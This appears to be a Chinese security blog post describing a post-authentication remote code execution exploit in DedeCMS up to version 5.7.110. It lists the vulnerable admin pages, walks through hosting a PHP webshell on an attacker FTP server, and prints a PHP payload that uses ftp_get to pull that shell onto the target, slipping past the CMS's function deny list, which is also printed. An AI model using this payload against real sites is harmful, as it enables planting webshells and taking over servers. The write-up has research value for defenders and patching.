> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1tyOySWRfutmahEm3K26iA)

#### 前言

[接上一篇的 Tricks](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652899360&idx=1&sn=2354854185d0228613491b9be93518ab&chksm=bd6674ed8a11fdfb7dc6e12d08401f90ad4f1f1365b15dbc87dbab540da204095a647936de2e&scene=21#wechat_redirect)，既然利用远程文件下载方式成为了实现 RCE 的最好方法，毕竟在执行的时候没有恶意 shell 文件，恶意木马被存放于远端服务器，那么下文的 day 就是对远程恶意文件的利用。

#### 环境

下载最新版本：

> https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.110-UTF8.zip

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3mQ2386xLP3r3Yow1TsmrbhJtetz4yT66mhaYjeLVInXFpg4YKQYhgg/640?wx_fmt=other)

影响版本：

`<=DedeCMS-V5.7.110`

漏洞 URL:

```
/uploads/dede/article_string_mix.php
/uploads/dede/sys_data.php
/uploads/dede/sys_task.php
/uploads/dede/media_add.php 
/uploads/dede/article_template_rand.php

```

#### 漏洞详情

远程服务器开启 ftp 服务

> 控制面板 >> 程序 >> 启用或关闭 windows 功能

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3ricdDthe6WNBianhgO4YiaPHLeC0XhG4CWWH6BxbQ3qHdYDvJWUReNUrw/640?wx_fmt=other)

完成更改

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3x1KVh6n6ovjM3b6Fd8pfLwtAH5u489MXlovmk9BrPPKOVQeqoCY7uQ/640?wx_fmt=other)

> 计算机管理

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3LibBbXzHC4qWyWsWePmZZv7eXWsTzDNjcuVtiaMdLGesXqgpGjJ2Gfiag/640?wx_fmt=other)

> 添加 FTP 站点

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3o2ibcptf4tNbkFcVby3VbUoOwiax1NRxw9vNgJZeo6jj8icxJXfSia9wPw/640?wx_fmt=other)

配置地址以及账号密码

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3JWOMj3RXbsib3FgLWSD9pjVVgQUuuicrCcCeDvuezxQBX3w1N9FxEcAw/640?wx_fmt=other)

上面存放一句话木马

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3KeaPWthWsBhbqXcWpJj9bYgicYQabQK221iaQQUSMVMjyfVMVXRiaJzzQ/640?wx_fmt=other)

文件内容为

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3GkRqVAa5ibGQ7uR9ChqzKliaMgzN2HZDIAHQcF2AOwtrQ1IIIsrWXZFg/640?wx_fmt=other)

payload 如下：

```
<?

$ftp_server = "192.168.0.102";
$ftp_username = "administrator";
$ftp_password = "147258369";

$file = "shell.php";
$local_file = "shell2.php";

// set up basic connection
$conn_id = ftp_connect($ftp_server);

// login with username and password
$login_result = ftp_login($conn_id, $ftp_username, $ftp_password);
// try to download $file and save to $local_file
if (ftp_get($conn_id, $local_file, $file, FTP_BINARY)) {
  echo "Successfully downloaded $file\n";
} else {
  echo "There was a problem while downloading $file\n";
}

// close the connection
ftp_close($conn_id);
?>

```

代码中的”ftp_server” 为远程服务器地址，”ftp_username” 为远程 ftp 登录用户名，”ftp_password” 为 ftp 登录密码，”$file” 为远程服务器的 shell 文件名，”$local_file” 为从远程服务器下载木马文件到本地的重命名文件。通过利用 ftp_get 函数远程下载恶意代码文件，代码中的”ftp_server” 为远程服务器地址，”ftp_username” 为远程 ftp 登录用户名，”ftp_password” 为 ftp 登录密码，”$file” 为远程服务器的 shell 文件名，”$local_file” 为从远程服务器下载木马文件到本地的重命名文件。

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3Ko3EGe49tSd1qVa66tGErWC9ryshMxAvoNBPDDxib7wEq8rGUrJHic8Q/640?wx_fmt=other)

文件保存后，访问路径

/uploads/data/template.rand.php

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3ZbuevpEpJx6W1wyPT9cVMyh4CtwbQA7j2VZurMWECicAF4lHLRFuG1A/640?wx_fmt=other)

提示已经成功下载一句话木马文件，查看当前目录已经生成名称为 shell2.php 的 shell 文件

http://dedecms.xyz:8066/uploads/data/shell3.php

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3ibicb7kElqb12l2RJ1jg5zV409iaNbLyticBW79ex7JoxBMdbwfQrGNuWA/640?wx_fmt=other)

成功命令执行

#### 漏洞分析

```
DedeCMS-V5.7.109-UTF8\uploads\dede\media_add.php

```

上传文件的时候仅仅只对权限以及上传类型做了校验，对文件内容未做校验导致漏洞产生。

继续向下看，文件上传文件处理代码`DedeCMS-V5.7.109-UTF8\uploads\dede\file_manage_control.php`

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3jeiaAImALwQjhlD65Q8YnTzxludVFicIHFiaiaLfibP4pZCicA0cThiaH3G4A/640?wx_fmt=other)

代码中定义了`disable_funs`, 但是禁用的函数涉及

```
phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders

```

在上面的 payload 中，利用手法利用点儿在于

![](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfNNB06nhtAY3qoKKMngwX3XIbq0p203OXN1pfxEWRmRUZdyUUpVCUcwn1NUQfBd6J0npxic9LUvGw/640?wx_fmt=other)

`ftp_get`函数是可以绕过`disable_funs`的，使用该函数实现 bypass 进行远程恶意代码调用，导致 RCE。

#### 小结

其它的方法也可以尝试，ftp 远程调用，telnet 远程调用等，包括很多方法可以实现，但是使用条件存在限制。其实在`Dede`由于后台参数可以直接进行配置，代码中`disable_funs`的定义没有意义，该模块只要存在，只要绕过正则，RCE 的方式有很多。

**原创稿件征集**

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全热点安全研究分析等安全相关

通过审核并发布能收获 200-800 元不等的稿酬。

[更多详情，点我查看！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

靶场实操，戳 “阅读原文”